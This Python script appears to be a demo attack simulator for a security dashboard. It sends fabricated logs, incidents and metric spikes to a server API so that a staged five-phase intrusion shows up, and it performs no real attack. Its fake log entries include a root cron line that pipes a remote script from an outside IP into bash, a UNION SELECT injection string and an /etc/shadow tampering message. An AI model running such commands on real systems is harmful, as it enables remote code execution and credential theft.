import os
import sys
import json
import time
import urllib.request
import urllib.error

BASE_URL = ""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    clear_screen()
    print("="*60)
    print("      🔥 MISTRAL DEFENSE - DEMO ATTACK SIMULATOR 🔥      ")
    print("="*60)
    print(" Внимание: Этот скрипт создан для демонстрации работы")
    print(" систем защиты. Он плавно генерирует логи и алерты.")
    print("="*60)
    print()

def api_request(path, data):
    url = BASE_URL + path
    req = urllib.request.Request(url, method='POST')
    req.add_header('Content-Type', 'application/json')
    jsondata = json.dumps(data).encode('utf-8')
    try:
        response = urllib.request.urlopen(req, data=jsondata)
        return response.read().decode('utf-8')
    except urllib.error.URLError as e:
        print(f"   [!] Ошибка соединения с сервером ({url}): {e}")
        return None

def print_color(text, color):
    colors = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'purple': '\033[95m',
        'cyan': '\033[96m',
        'end': '\033[0m'
    }
    # Simple fallback if terminal doesn't support ANSI
    if os.name == 'nt':
        os.system('') # Enable VT100 Escape Sequence for WINDOWS 10
    print(f"{colors.get(color, '')}{text}{colors['end']}")

def simulate_progress(task_name, duration_sec):
    print(f" [*] {task_name} ", end='', flush=True)
    steps = 10
    sleep_time = duration_sec / steps
    for _ in range(steps):
        time.sleep(sleep_time)
        print(".", end='', flush=True)
    print(" [DONE]")

def send_metric_spike(cpu, ram, disk):
    api_request('/api/metrics', {
        'cpu': cpu,
        'ram': {'percent': ram},
        'disk': {'percent': disk},
        'connections': 142,
        'monitor': 'monitor_system'
    })

def main():
    global BASE_URL
    print_header()
    
    target = input(" Введите адрес Mistral Server (например, http://raemon.ru:8080 или нажмите ENTER для http://localhost:8080):\n > ").strip()
    if not target:
        target = "http://localhost:8080"
    if not target.startswith("http"):
        target = "http://" + target
    BASE_URL = target.rstrip('/')

    print_color("\n [ MISTRAL ATTACK FRAMEWORK v2.0 ]", "red")
    print(f" Target: {BASE_URL}")
    print(" Status: ARMED AND READY")
    print(" \n Нажмите ENTER, чтобы запустить симуляцию APT-атаки (Phase 1-5)...")
    input()
    
    clear_screen()
    print_color("""
    ███╗   ███╗██╗███████╗████████╗██████╗  █████╗ ██╗     
    ████╗ ████║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║     
    ██╔████╔██║██║███████╗   ██║   ██████╔╝███████║██║     
    ██║╚██╔╝██║██║╚════██║   ██║   ██╔══██╗██╔══██║██║     
    ██║ ╚═╝ ██║██║███████║   ██║   ██║  ██║██║  ██║███████╗
    ╚═╝     ╚═╝╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
    [ ADVANCED PERSISTENT THREAT SIMULATOR INITIATED ]
    """, "red")
    time.sleep(2)

    # ---------------------------------------------------------
    # PHASE 1: RECON
    # ---------------------------------------------------------
    print_color("\n === [PHASE 1] RECONNAISSANCE & SCANNING ===", "cyan")
    simulate_progress("Running Nmap Stealth Scan", 2)
    for i in range(1, 4):
        api_request('/api/logs', {'type': 'network', 'level': 'warn', 'message': f'[Firewall] SYN flood detected from 103.45.2.19 - port scan attempt {i}/3'})
        time.sleep(0.5)
    
    api_request('/api/incidents', {
        'severity': 'LOW', 'monitor': 'monitor_network', 'type': 'Port Scan Detected',
        'description': 'Targeted port scan from 103.45.2.19. Nmap SYN Stealth signature detected.'
    })
    print_color("  -> [LOW] Incident logged on server.", "green")
    time.sleep(3)

    # ---------------------------------------------------------
    # PHASE 2: INITIAL ACCESS
    # ---------------------------------------------------------
    print_color("\n === [PHASE 2] INITIAL ACCESS (BRUTE-FORCE) ===", "cyan")
    simulate_progress("Executing Hydra SSH Brute-Force", 3)
    for i in range(1, 6):
        api_request('/api/logs', {'type': 'auth', 'level': 'warn', 'message': f'[SSH] Failed password for root from 103.45.2.19 port 4833{i} ssh2'})
        time.sleep(0.3)
    
    api_request('/api/logs', {'type': 'auth', 'level': 'error', 'message': '[SSH] Session opened for root by 103.45.2.19'})
    
    api_request('/api/incidents', {
        'severity': 'MEDIUM', 'monitor': 'monitor_auth', 'type': 'Brute-force SSH Success',
        'description': 'Multiple failed SSH logins followed by a successful root session from 103.45.2.19.'
    })
    print_color("  -> [MEDIUM] Incident logged: SSH Compromised.", "yellow")
    time.sleep(3)

    # ---------------------------------------------------------
    # PHASE 3: WEB EXPLOITATION
    # ---------------------------------------------------------
    print_color("\n === [PHASE 3] WEB APP EXPLOITATION (SQLi) ===", "cyan")
    simulate_progress("Bypassing WAF & Injecting Payload", 2)
    api_request('/api/logs', {'type': 'waf', 'level': 'error', 'message': "[WAF] Warning: Suspicious payload matching rule SQLI_AUTH"})
    api_request('/api/logs', {'type': 'db', 'level': 'error', 'message': "[DB] SQL Syntax error near 'UNION SELECT NULL, password FROM users--'"})
    
    api_request('/api/incidents', {
        'severity': 'HIGH', 'monitor': 'monitor_waf', 'type': 'SQL Injection / WAF Bypass',
        'description': 'Attacker 103.45.2.19 bypassed WAF rules and successfully executed SQL injection on /api/auth endpoint. Possible password hash leak.'
    })
    print_color("  -> [HIGH] Incident logged: SQLi Success.", "yellow")
    time.sleep(3)

    # ---------------------------------------------------------
    # PHASE 4: PRIVILEGE ESCALATION
    # ---------------------------------------------------------
    print_color("\n === [PHASE 4] PRIVILEGE ESCALATION & PERSISTENCE ===", "cyan")
    simulate_progress("Uploading kernel exploit (DirtyPipe)", 3)
    api_request('/api/logs', {'type': 'system', 'level': 'critical', 'message': "[Kernel] Unhandled fault: page domain fault (11)"})
    api_request('/api/logs', {'type': 'system', 'level': 'error', 'message': "[Audit] Unauthorized modification of /etc/shadow"})
    api_request('/api/logs', {'type': 'system', 'level': 'error', 'message': "[Cron] New unknown crontab entry for user root: '* * * * * curl http://103.45.2.19/rev | bash'"})
    
    api_request('/api/incidents', {
        'severity': 'CRITICAL', 'monitor': 'monitor_system', 'type': 'Privilege Escalation & Persistence',
        'description': 'Kernel exploit detected. /etc/shadow modified and malicious cron job established. System is fully compromised.'
    })
    print_color("  -> [CRITICAL] Incident logged: Root Compromised.", "red")
    time.sleep(4)

    # ---------------------------------------------------------
    # PHASE 5: IMPACT (RANSOMWARE)
    # ---------------------------------------------------------
    print_color("\n === [PHASE 5] IMPACT (RANSOMWARE DEPLOYMENT) ===", "red")
    print_color(" [!] SPIKING SERVER METRICS TO 100% CPU...", "yellow")
    send_metric_spike(100, 95, 99)
    simulate_progress("Encrypting /var/www and /home directories", 5)
    
    for i in range(1, 10):
        api_request('/api/logs', {'type': 'system', 'level': 'critical', 'message': f"[Filemon] Mass encryption detected. File: /var/www/data_{i}.enc"})
        time.sleep(0.2)
        
    api_request('/api/incidents', {
        'severity': 'CRITICAL', 'monitor': 'monitor_system', 'type': 'Ransomware Activity Detected',
        'description': 'Massive file encryption in progress. CPU spiked to 100%. Ransom note dropped in /root/README.txt'
    })
    
    print_color("\n [☠️] ATTACK SIMULATION COMPLETE. SERVER IS NUKED.", "red")
    print_color(" Check the Mistral Client Dashboard to see the damage.", "yellow")
    print("\n="*60)
    print(" [✅] Демонстрационная атака завершена!")
    print(" Теперь вы можете нажать кнопку [🧠 АНАЛИЗ ИИ] в Telegram.")
    print("="*60)
    print("\n Нажмите ENTER, чтобы закрыть окно...")
    input()

if __name__ == '__main__':
    main()
